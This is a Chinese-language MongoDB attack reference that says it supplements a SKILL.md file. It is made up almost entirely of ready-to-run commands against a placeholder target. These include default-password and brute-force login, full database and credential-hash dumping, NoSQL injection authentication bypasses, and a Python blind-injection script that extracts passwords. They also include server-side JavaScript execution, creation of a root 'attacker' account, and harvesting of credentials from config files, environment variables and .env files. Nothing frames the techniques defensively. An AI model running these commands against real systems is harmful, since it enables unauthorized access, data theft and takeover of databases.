# MongoDB 攻击技术参考

> 本文档是 SKILL.md 各 Phase 的详细命令与技术补充。

---

## 1. 未授权访问与弱口令

### 利用条件
- MongoDB 监听在 0.0.0.0（3.6 之前默认配置）
- 未启用认证（`authorization: disabled` 或未配置）
- 27017 端口可达（无防火墙拦截）

### 连接测试

```bash
# 无密码直连（mongosh 新版客户端）
mongosh --host TARGET --port 27017

# 无密码直连（mongo 旧版客户端）
mongo --host TARGET --port 27017

# Nmap 信息收集
nmap -p 27017 --script mongodb-info TARGET

# 验证是否需要认证
mongosh --host TARGET --port 27017 --eval "db.adminCommand({listDatabases: 1})"
# 成功返回数据库列表 → 无认证
# 返回认证错误 → 需要密码
```

### 默认凭据尝试

```bash
# 常见默认账号密码组合
mongosh --host TARGET --port 27017 -u admin -p admin --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u root -p root --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u admin -p 123456 --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u mongodb -p mongodb --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u admin -p admin123 --authenticationDatabase admin
mongosh --host TARGET --port 27017 -u root -p 123456 --authenticationDatabase admin
```

### 爆破工具

```bash
# Hydra
hydra -L users.txt -P passwords.txt TARGET mongodb

# Nmap 内置爆破
nmap -p 27017 --script mongodb-brute TARGET

# Metasploit
msf> use auxiliary/scanner/mongodb/mongodb_login
msf> set RHOSTS TARGET
msf> run

# 用户名字典建议
admin, root, mongodb, mongoadmin, dbadmin, mongouser
```

**攻击效果**: 获得 MongoDB 完全控制权限，可进行后续所有数据库操作。

---

## 2. 数据库枚举与导出

### 利用条件
- 已获得 MongoDB 访问权限（未授权或已知凭据）
- 目标 MongoDB 中存储有业务数据

### 数据库与集合枚举

```bash
# 列出所有数据库
mongosh --host TARGET --port 27017 --eval "db.getMongo().getDBNames()"

# 或使用 adminCommand
mongosh --host TARGET --port 27017 --eval "db.adminCommand({listDatabases: 1})"

# 列出指定数据库中的集合
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").getCollectionNames()'

# 查看集合统计信息
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.stats()'

# 查看集合文档数量
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.countDocuments({})'
```

### 数据查询与提取

```bash
# 读取所有文档
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.find().forEach(printjson)'

# 限制返回数量（避免输出过大）
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.find().limit(10).forEach(printjson)'

# 搜索含密码字段的文档
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.find({password: {$exists: true}}).forEach(printjson)'

# 搜索含 email 字段的文档
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.find({email: {$exists: true}}).forEach(printjson)'

# 搜索含 token/secret 字段
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.find({token: {$exists: true}}).forEach(printjson)'
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").collection.find({secret: {$exists: true}}).forEach(printjson)'

# 仅返回特定字段（投影）
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").users.find({}, {username: 1, password: 1, email: 1}).forEach(printjson)'
```

### 用户凭据提取

```bash
# 访问 admin 数据库，列出所有用户
mongosh --host TARGET --port 27017 --eval "use admin; db.system.users.find().forEach(printjson)"

# 获取用户列表与角色
mongosh --host TARGET --port 27017 --eval "use admin; db.getUsers()"

# 提取密码哈希（可用于离线破解）
mongosh --host TARGET --port 27017 --eval "use admin; db.system.users.find({}, {user: 1, credentials: 1}).forEach(printjson)"
```

### mongodump 全量导出

```bash
# 导出所有数据库
mongodump --host TARGET --port 27017 --out /tmp/mongodb-dump

# 导出指定数据库
mongodump --host TARGET --port 27017 -d database_name --out /tmp/mongodb-dump

# 导出指定集合
mongodump --host TARGET --port 27017 -d database_name -c collection_name --out /tmp/mongodb-dump

# 带认证的导出
mongodump --host TARGET --port 27017 -u admin -p password --authenticationDatabase admin --out /tmp/mongodb-dump

# 导出为归档文件（单文件）
mongodump --host TARGET --port 27017 --archive=/tmp/mongodb-dump.archive

# 导出为压缩归档
mongodump --host TARGET --port 27017 --gzip --archive=/tmp/mongodb-dump.archive.gz
```

### mongoexport 导出为 JSON/CSV

```bash
# 导出为 JSON
mongoexport --host TARGET --port 27017 -d database_name -c collection_name --out /tmp/data.json

# 导出为 CSV（需指定字段）
mongoexport --host TARGET --port 27017 -d database_name -c collection_name --type=csv --fields=username,password,email --out /tmp/data.csv

# 带查询条件导出
mongoexport --host TARGET --port 27017 -d database_name -c users --query='{"role": "admin"}' --out /tmp/admins.json
```

**攻击效果**: 获取全部数据库内容，包括用户凭据、业务数据、API 密钥等敏感信息。

---

## 3. NoSQL 注入

### 利用条件
- Web 应用使用 MongoDB 作为后端数据库
- 用户输入未经过滤直接传入 MongoDB 查询
- 应用接受 JSON 请求体或将 URL 参数转换为对象

### 3.1 认证绕过（$ne / $gt / $regex）

#### JSON 格式（Content-Type: application/json）

```json
// $ne 绕过 — 用户名和密码均不为空
{"username": {"$ne": ""}, "password": {"$ne": ""}}

// $ne 指定用户名
{"username": "admin", "password": {"$ne": ""}}

// $gt 绕过 — 密码大于空字符串（总为真）
{"username": {"$gt": ""}, "password": {"$gt": ""}}

// $regex 绕过 — 正则匹配任意字符串
{"username": "admin", "password": {"$regex": ".*"}}

// $in 绕过 — 传入数组
{"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}}

// $exists 绕过
{"username": {"$exists": true}, "password": {"$exists": true}}

// $nin 绕过（不在空数组中 = 所有）
{"username": {"$nin": []}, "password": {"$nin": []}}
```

#### URL 参数格式

```
username[$ne]=&password[$ne]=
username=admin&password[$ne]=
username[$gt]=&password[$gt]=
username=admin&password[$regex]=.*
username[$in][0]=admin&username[$in][1]=root&password[$ne]=
```

**关键判断**: 返回 200 并包含登录成功特征（如 token、redirect、session cookie）即为注入成功。

### 3.2 数据提取（$regex 逐字符盲注）

```
# 判断密码第一个字符
{"username": "admin", "password": {"$regex": "^a"}}  → 测试 a-z, A-Z, 0-9
{"username": "admin", "password": {"$regex": "^b"}}
...

# 确定第一位后继续第二位
{"username": "admin", "password": {"$regex": "^aA"}}
{"username": "admin", "password": {"$regex": "^aB"}}
...

# 确定密码长度
{"username": "admin", "password": {"$regex": "^.{6}$"}}  → 测试不同长度

# 提取用户名列表
{"username": {"$regex": "^a"}, "password": {"$ne": ""}}
{"username": {"$regex": "^b"}, "password": {"$ne": ""}}
...
```

#### Python 自动化盲注脚本

```python
import requests
import string

url = "http://TARGET/login"
charset = string.ascii_letters + string.digits + "!@#$%^&*"
password = ""

for i in range(32):  # 最大长度 32
    found = False
    for c in charset:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{c}"}
        }
        r = requests.post(url, json=payload)
        if "success" in r.text or r.status_code == 302:
            password += c
            print(f"[+] Found: {password}")
            found = True
            break
    if not found:
        break

print(f"[+] Password: {password}")
```

### 3.3 $where JavaScript 注入

```json
// 基础 $where 注入
{"$where": "this.username == 'admin'"}

// 条件组合
{"$where": "this.username == 'admin' && this.password == 'secret'"}

// 利用 $where 提取数据（通过布尔盲注）
{"$where": "this.username == 'admin' && this.password.charAt(0) == 'a'"}
{"$where": "this.username == 'admin' && this.password.charAt(1) == 'b'"}

// 利用 $where 获取字段名
{"$where": "Object.keys(this).length > 3"}
{"$where": "Object.keys(this)[3] == 'secret_field'"}
```

### 3.4 时间盲注

```json
// 基于 sleep() 的时间盲注
{"$where": "if(this.username=='admin'){sleep(5000);return true}else{return false}"}

// 逐字符时间盲注
{"$where": "if(this.username=='admin' && this.password.charAt(0)=='a'){sleep(5000);return true}else{return false}"}

// URL 编码格式
username=admin&password[$where]=if(this.password.charAt(0)=='a'){sleep(5000)}
```

**关键判断**: 响应时间明显延长（> 5 秒）表示条件为真。

### 3.5 NoSQL 注入自动化工具

```bash
# NoSQLMap
git clone https://github.com/codingo/NoSQLMap
cd NoSQLMap
python3 nosqlmap.py

# 设置目标
# 1 - Set Target Host
# 2 - Set Target Port
# 3 - Set Target URI
# 5 - Exploit

# Burp Suite 插件：NoSQL Injection
# 安装后自动检测 NoSQL 注入点
```

**攻击效果**: 绕过认证获得管理员权限，或逐字符提取数据库中的敏感数据。

---

## 4. JavaScript 执行

### 利用条件
- 有执行 JavaScript 的权限
- `db.eval()`: MongoDB < 4.2（4.2 已移除）
- `mapReduce`: 需对目标集合有读权限
- `$where`: 需对目标集合有查询权限

### 4.1 db.eval() (MongoDB < 4.2)

```javascript
// 执行任意 JavaScript
db.eval("return db.getMongo().getDBNames()")

// 获取所有数据库名
db.eval("return db.adminCommand({listDatabases: 1})")

// 列出用户
db.eval("return db.system.users.find().toArray()")

// 执行复杂逻辑
db.eval("var dbs = db.getMongo().getDBNames(); var result = []; dbs.forEach(function(d){ var c = db.getSiblingDB(d).getCollectionNames(); result.push({db: d, collections: c}); }); return result;")
```

### 4.2 mapReduce JS 执行

```javascript
// 基础 mapReduce（通过 map/reduce 函数执行 JS）
db.collection.mapReduce(
  function() { emit(this._id, this); },
  function(key, values) { return values[0]; },
  { out: { inline: 1 } }
)

// 利用 map 函数提取数据
db.collection.mapReduce(
  function() {
    var users = db.getSiblingDB("admin").system.users.find().toArray();
    emit("users", JSON.stringify(users));
  },
  function(key, values) { return values.join(","); },
  { out: { inline: 1 } }
)

// 利用 finalize 函数
db.collection.mapReduce(
  function() { emit(1, 1); },
  function(k, v) { return 1; },
  {
    out: { inline: 1 },
    finalize: function(key, value) {
      return db.getSiblingDB("admin").system.users.find().toArray();
    }
  }
)
```

### 4.3 $where JS 执行（服务端）

```javascript
// $where 中的代码在 MongoDB 服务端执行
db.collection.find({$where: "function() { return this.password == 'secret'; }"})

// 利用 $where 枚举字段名
db.collection.find({$where: "function() { return Object.keys(this).indexOf('secret_field') > -1; }"})
```

**攻击效果**: 在 MongoDB 服务端执行任意 JavaScript，可访问其他数据库和集合的数据。

---

## 5. 权限提升

### 利用条件
- 已有低权限 MongoDB 用户
- 当前用户有 `createUser` 或 `grantRolesToUser` 权限
- 或者当前用户有 `userAdmin` / `userAdminAnyDatabase` 角色

### 创建管理员用户

```javascript
// 在 admin 库创建具有最高权限的用户
use admin
db.createUser({
  user: "attacker",
  pwd: "password",
  roles: [{role: "userAdminAnyDatabase", db: "admin"}]
})

// 创建 root 权限用户
use admin
db.createUser({
  user: "attacker",
  pwd: "password",
  roles: [{role: "root", db: "admin"}]
})

// 创建具有所有数据库读写权限的用户
use admin
db.createUser({
  user: "attacker",
  pwd: "password",
  roles: [
    {role: "readWriteAnyDatabase", db: "admin"},
    {role: "dbAdminAnyDatabase", db: "admin"},
    {role: "clusterAdmin", db: "admin"}
  ]
})
```

### 提升现有用户权限

```javascript
// 授予 root 角色
use admin
db.grantRolesToUser("attacker", [{role: "root", db: "admin"}])

// 更新用户角色（替换所有角色）
use admin
db.updateUser("existing_user", {roles: [{role: "root", db: "admin"}]})

// 使用 adminCommand 提升
db.adminCommand({
  grantRolesToUser: "attacker",
  roles: [{role: "root", db: "admin"}]
})
```

### MongoDB 角色层级参考

```
root                    — 最高权限，包含所有角色
├─ userAdminAnyDatabase — 管理所有数据库的用户
├─ dbAdminAnyDatabase   — 管理所有数据库
├─ readWriteAnyDatabase — 读写所有数据库
├─ clusterAdmin         — 集群管理
├─ backup               — 数据库备份
└─ restore              — 数据库恢复

# 单库角色
readWrite               — 读写指定数据库
dbAdmin                 — 管理指定数据库
userAdmin               — 管理指定数据库的用户
```

**攻击效果**: 从低权限用户提升为 root，获得 MongoDB 实例的完全控制权。

---

## 6. GridFS 文件提取

### 利用条件
- 已获得 MongoDB 访问权限
- 目标数据库使用 GridFS 存储文件
- 数据库中存在 `fs.files` 和 `fs.chunks` 集合

### 枚举 GridFS 文件

```bash
# 检查是否存在 GridFS 集合
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").getCollectionNames()'
# 查找 fs.files 和 fs.chunks

# 列出所有存储的文件
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").fs.files.find().forEach(printjson)'

# 查看文件元数据（文件名、大小、上传时间、类型）
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").fs.files.find({}, {filename: 1, length: 1, uploadDate: 1, contentType: 1}).forEach(printjson)'

# 搜索特定类型的文件
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").fs.files.find({filename: /\.pdf$/}).forEach(printjson)'
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").fs.files.find({filename: /\.xlsx$/}).forEach(printjson)'
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").fs.files.find({contentType: "application/pdf"}).forEach(printjson)'
```

### 下载 GridFS 文件

```bash
# 使用 mongofiles 工具列出文件
mongofiles --host TARGET --port 27017 -d database_name list

# 下载指定文件
mongofiles --host TARGET --port 27017 -d database_name get filename.pdf

# 下载到指定路径
mongofiles --host TARGET --port 27017 -d database_name get_id "ObjectId('...')" --local=/tmp/output.pdf

# 带认证下载
mongofiles --host TARGET --port 27017 -d database_name -u admin -p password --authenticationDatabase admin get filename
```

### 批量下载

```bash
# 列出所有文件名后批量下载
mongosh --host TARGET --port 27017 --eval 'db.getSiblingDB("database_name").fs.files.find({}, {filename: 1}).forEach(function(f){print(f.filename)})' | while read fname; do
  mongofiles --host TARGET --port 27017 -d database_name get "$fname"
done
```

**攻击效果**: 获取存储在 GridFS 中的文件，可能包含文档、配置文件、备份等敏感内容。

---

## 7. 配置文件与凭据

### 利用条件
- 已获得目标服务器文件系统访问权限（通过其他漏洞）
- 或可通过 MongoDB 命令获取配置信息

### 配置文件位置

```bash
# 主配置文件
/etc/mongod.conf              # Linux 默认
/usr/local/etc/mongod.conf     # macOS Homebrew
C:\Program Files\MongoDB\Server\X.Y\bin\mongod.cfg  # Windows

# 数据文件目录
/var/lib/mongodb/              # Linux 默认 dbPath
/var/lib/mongo/                # CentOS/RHEL

# 日志文件
/var/log/mongodb/mongod.log    # 默认日志路径

# keyFile（副本集认证）
/etc/mongodb-keyfile           # 常见路径
/var/lib/mongodb/keyfile
```

### 配置文件关键信息

```yaml
# mongod.conf 中的敏感配置

# 绑定地址（是否暴露在外网）
net:
  bindIp: 0.0.0.0        # 危险：监听所有接口
  port: 27017

# 认证配置（是否启用认证）
security:
  authorization: disabled  # 危险：未启用认证
  keyFile: /path/to/keyfile

# 数据目录
storage:
  dbPath: /var/lib/mongodb

# 副本集配置
replication:
  replSetName: rs0
```

### 通过 MongoDB 命令获取配置

```bash
# 获取命令行启动参数
mongosh --host TARGET --port 27017 --eval "db.adminCommand({getCmdLineOpts: 1})"

# 获取服务器参数
mongosh --host TARGET --port 27017 --eval "db.adminCommand({getParameter: '*'})"

# 获取日志内容（可能包含认证尝试信息）
mongosh --host TARGET --port 27017 --eval "db.adminCommand({getLog: 'global'})"
```

### 连接字符串中的凭据

```bash
# Web 应用配置文件中常见的 MongoDB 连接字符串
# 搜索目标服务器上的配置文件
grep -r "mongodb://" /var/www/ /opt/ /etc/ 2>/dev/null
grep -r "mongoose.connect" /var/www/ /opt/ 2>/dev/null
grep -r "MONGO_URI" /var/www/ /opt/ /etc/ 2>/dev/null

# 常见连接字符串格式
# mongodb://username:password@host:27017/database
# mongodb+srv://username:password@cluster.mongodb.net/database
```

### 环境变量中的凭据

```bash
# 检查环境变量
env | grep -i mongo
printenv | grep -i mongo

# Docker 环境
cat /proc/1/environ | tr '\0' '\n' | grep -i mongo

# .env 文件
find / -name ".env" -exec grep -l "MONGO" {} \; 2>/dev/null
```

**攻击效果**: 获取 MongoDB 连接凭据和配置信息，可能用于访问其他 MongoDB 实例或获取副本集认证密钥。

---

## 工具清单

| 工具 | 地址 | 用途 |
|------|------|------|
| mongosh | MongoDB 官方自带 | MongoDB Shell 客户端（5.0+） |
| mongo | MongoDB 官方自带 | 旧版 MongoDB Shell（4.x 及更早） |
| mongodump | MongoDB 官方自带 | 数据库 BSON 全量导出 |
| mongoexport | MongoDB 官方自带 | 集合 JSON/CSV 导出 |
| mongofiles | MongoDB 官方自带 | GridFS 文件操作 |
| NoSQLMap | https://github.com/codingo/NoSQLMap | NoSQL 注入扫描与自动化利用 |
| nosqli | https://github.com/Charlie-belmer/nosqli | NoSQL 注入检测工具 |
| nmap mongodb-info | Nmap NSE 自带 | MongoDB 信息收集与爆破 |
| Metasploit | auxiliary/scanner/mongodb/ | MongoDB 登录爆破模块 |
